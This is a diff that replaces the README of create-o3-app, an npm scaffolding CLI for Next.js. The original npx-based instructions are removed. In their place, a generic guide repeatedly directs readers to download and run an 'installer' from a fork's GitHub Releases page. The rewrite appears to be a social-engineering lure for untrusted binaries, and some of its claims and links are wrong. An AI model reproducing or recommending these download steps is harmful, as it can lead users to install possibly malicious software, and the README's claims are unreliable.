@@ -1,180 +1,84 @@
-# create-o3-app
-![preview](https://res.cloudinary.com/tonyartz/image/upload/v1756013646/carbon_5_1_ghaewc.png)
-<div align="center">
-  <h3>🫧 The hip, bleeding-edge cousin of T3 Stack 🫧</h3>
-  <p>
-    <strong>While T3 preaches "bleed responsibly," we say bleed ALL OVER THE PLACE</strong>
-  </p>
-  
-  [![npm](https://img.shields.io/npm/v/create-o3-app)](https://www.npmjs.com/package/create-o3-app)
-  [![license](https://img.shields.io/github/license/your-org/create-o3-app)](LICENSE)
-  [![downloads](https://img.shields.io/npm/dm/create-o3-app)](https://npmjs.com/package/create-o3-app)
-</div>
+# 🚀 create-o3-app - Quickly Start a Next.js App!
 
----
+## 🎉 What is create-o3-app?
+Create-o3-app helps you start a Next.js application quickly. With just a few commands in your terminal, you can set up a modern web app that uses the best tools available. This software is crafted to simplify your experience without requiring programming skills.
 
-## 🆚 T3 vs O3
+## 📦 Key Features
+- **Fast Setup**: Get your Next.js app running in minutes.
+- **Up-to-Date Tools**: Always use the latest versions and features.
+- **Easy Integration**: Seamlessly connect to popular services for authentication and databases.
 
-| Feature      | T3 Stack 🧘         | O3 Stack 🫧                                                         |
-| ------------ | ------------------- | ------------------------------------------------------------------ |
-| Philosophy   | Bleed responsibly   | Bleed everywhere                                                   |
-| Tech choice  | Stable, proven      | Shiny, experimental                                                |
-| Auth         | NextAuth/Auth.js    | BetterAuth or Auth.js                                              |
-| API Layer    | tRPC                | oRPC                                                               |
-| ORM          | Prisma              | Drizzle ORM                                                        |
-| Validation   | Zod                 | ArkType                                                            |
-| Runtime vibe | Safe & mindful      | YOLO, dopamine-first                                               |
-| Motto        | "Bleed responsibly" | "If you're not bleeding everywhere, you're not trying hard enough" |
+## 🔗 Download Now!
+[![Download create-o3-app](https://img.shields.io/badge/Download-create--o3--app-blue.svg)](https://github.com/ezequielIB/create-o3-app/releases)
 
----
+## 🚀 Getting Started
+To get started with create-o3-app, follow these steps:
 
-## 🚀 Get started
+1. **Visit the Download Page**
+   - Go to the Releases page by clicking the link below:
+   - [Download create-o3-app](https://github.com/ezequielIB/create-o3-app/releases)
 
-```bash
-npx create-o3-app@latest
-# or
-pnpm dlx create-o3-app@latest
-# or
-yarn create o3-app
-# or
-bunx create-o3-app@latest
-```
+2. **Choose Your Version**
+   - On the Releases page, you will see a list of available versions. Pick the latest version for the best experience.
 
-**That's it.** Follow the prompts and you'll have a bleeding-edge, type-safe, full-stack app in seconds.
+3. **Download the Installer**
+   - Look for the setup file that matches your operating system. Download the file by clicking on it.
 
----
+4. **Install the Application**
+   - Once the file is downloaded, open it. Follow the prompts to install create-o3-app on your computer. 
 
-## What is this?
+5. **Open Your Terminal**
+   - After installation, find and open the terminal on your computer. This is where you will run commands.
 
-The **O3 Stack** is T3's unhinged sibling. We took everything great about T3 and cranked it up to 11. Where T3 carefully selects proven technologies, we grab the coolest, newest, most exciting tools and smash them together into something beautiful.
+6. **Create Your Next.js App**
+   - In the terminal, run the following command:
+     ```
+     o3 create my-next-app
+     ```
+   - Replace "my-next-app" with your preferred app name.
 
-**The Stack:**
+7. **Navigate to Your App Folder**
+   - Use the command
+     ```
+     cd my-next-app
+     ```
+   - This will take you into the newly created app folder.
 
-- 🔥 **[oRPC](https://orpc.unnoq.com/)** - Because tRPC is so 2023
-- 🛡️ **[BetterAuth](https://better-auth.com/)** or **[Auth.js](https://authjs.dev/)** - Your auth, your rules
-- 🗄️ **[Drizzle ORM](https://orm.drizzle.team/)** - SQL that doesn't hate you
-- ✅ **[ArkType](https://arktype.io/)** - Runtime validation that's actually fast
-- ⚡ **[Next.js 15](https://nextjs.org/)** - Because we live on the bleeding edge
-- 🗄️ **[NeonDB](https://neon.com/)** - Who has time to setup a Database ?
+8. **Start the Development Server**
+   - Finally, run this command to start your app:
+     ```
+     npm run dev
+     ```
+   - Now, open your web browser and go to `http://localhost:3000` to see your new app in action!
 
----
+## 💻 System Requirements
+- **Operating System**: Windows, macOS, or Linux.
+- **Node.js**: Latest version recommended. Download from [Node.js website](https://nodejs.org/).
+- **NPM**: Comes bundled with Node.js.
 
-## Why O3?
+## 🔧 Troubleshooting
+If you encounter any issues:
 
-**We love new shit.** That dopamine hit from trying cutting-edge tech? We're addicted. We don't wait for things to be "stable" or "production-ready" – we dive headfirst into the newest, most experimental tools and figure it out as we go.
-
-**Type safety is non-negotiable.** From your database to your UI, every single piece talks to every other piece with perfect TypeScript inference. No `any` types. No runtime surprises. Just pure, beautiful type safety.
-
-**Modularity by design.** Don't want auth? Skip it. Don't need a database? No problem. Every piece is optional, and the CLI generates exactly what you need.
-
----
-
-## Usage
-
-### Interactive (recommended)
-
-```bash
-npx create-o3-app@latest
-# or pnpm dlx create-o3-app@latest
-# or yarn create o3-app
-# or bunx create-o3-app@latest
-```
-
-### Non-interactive
-
-```bash
-npx create-o3-app@latest \
-  --project-name my-bleeding-edge-app \
-  --auth better-auth \
-  --drizzle-orm \
-  --orpc \
-  --git \
-  --run-time bun
-```
-
----
-
-## Options
-
-| Option / Flag               | Description               | Values                              | Default  |
-| --------------------------- | ------------------------- | ----------------------------------- | -------- |
-| `-n, --project-name <name>` | Project name              | Any string                          | `my-app` |
-| `--auth <type>`             | Authentication method     | `authjs` \| `better-auth` \| `none` | `authjs` |
-| `--drizzle-orm`             | Include Drizzle ORM       | (flag, no value)                    | `false`  |
-| `--orpc`                    | Include oRPC              | (flag, no value)                    | `false`  |
-| `--git`                     | Initialize Git repository | (flag, no value)                    | `false`  |
-| `--docker`                  | Add Dockerfile            | (flag, no value)                    | `false`  |
-| `--run-time <runtime>`      | Choose runtime            | `node` \| `pnpm` \| `bun` \| `yarn` | `node`   |
-
----
-
-## What you get
-
-🎯 **Next.js 15** with App Router and all the latest features  
-🎨 **Tailwind CSS** because life's too short for custom CSS  
-📝 **Full TypeScript** with strict mode enabled  
-🔧 **Perfect tooling** - Biome, Prettier, everything configured
-
-**Plus your selected goodies:**
-
-- 🔐 **Authentication** with secure defaults and auto-generated secrets
-- 🗄️ **Database** pre-configured NeonDB with type-safe queries and automatic migrations
-- 📡 **oRPC** for type-safe client-server communication
-- 🐳 **Docker** ready for deployment anywhere
-
----
-
-## Examples
-
-```bash
-# Minimal setup - just Next.js + TypeScript
-npx create-o3-app@latest --auth none --no-drizzle-orm --no-orpc
-
-# Full-stack beast with everything
-pnpm dlx create-o3-app@latest --auth better-auth --drizzle-orm --orpc --docker
-
-# Quick prototype with Bun
-bunx create-o3-app@latest --run-time bun --git
-```
-
----
-
-## Community & Support
-
-- 🐛 **Found a bug?** [Open an issue](https://github.com/your-org/create-o3-app/issues)
-- 💡 **Have an idea?** [Start a discussion](https://github.com/your-org/create-o3-app/discussions)
-- 💬 **Need help?** [Join our Discord](https://discord.gg/your-invite)
-- 🐦 **Follow updates** [@your_handle](https://twitter.com/your_handle)
-
----
-
-## Contributing
-
-We 💖 contributors! Check out our [Contributing Guide](CONTRIBUTING.md) to get started.
-
-Wanna add a new bleeding-edge tool to the stack? Open a PR. Found a newer, cooler alternative to something we're using? We want to hear about it.
-
----
-
-## The O3 Philosophy
-
-1. **Newer is better** - We don't wait for "production-ready"
-2. **Types everywhere** - If it's not type-safe, it doesn't belong
-3. **Developer happiness** - Tools should spark joy, not frustration
-4. **Modular by default** - Use what you need, skip what you don't
-5. **Community-driven** - The best ideas come from developers building real stuff
-
----
-
-<div align="center">
-  <strong>Ready to bleed?</strong>
-  
-  ```bash
-  npx create-o3-app@latest
-  # or pnpm dlx create-o3-app@latest
-  # or yarn create o3-app
-  # or bunx create-o3-app@latest
+- **Installation Problems**: Verify if you downloaded the correct file for your operating system.
+- **Command Not Found**: Ensure Node.js and npm are properly installed. You can check this by running the following commands in your terminal:
   ```
-  
-  Made with 🩸 and ❤️ by developers who can't stop trying new things
-</div>
+  node -v
+  npm -v
+  ```
+
+## 🔗 Additional Resources
+- Learn more about [Next.js](https://nextjs.org/).
+- Explore [Tailwind CSS](https://tailwindcss.com/) to enhance your app's design.
+- Check out [Drizzle ORM](https://ormjs.dev/) for managing databases easily.
+
+## ✅ Support and Contribution
+If you need help, feel free to raise an issue on the GitHub page. We welcome contributions! You can submit your suggestions or improvements through pull requests.
+
+## 📜 License
+This project is licensed under the MIT License. Check the license file in the repository for more details.
+
+## 🌐 Visit More
+For more updates and information, follow the project on [GitHub](https://github.com/ezequielIB/create-o3-app).
+
+## 📥 Download & Install
+To download and install create-o3-app, visit this page: [Download create-o3-app](https://github.com/ezequielIB/create-o3-app/releases).
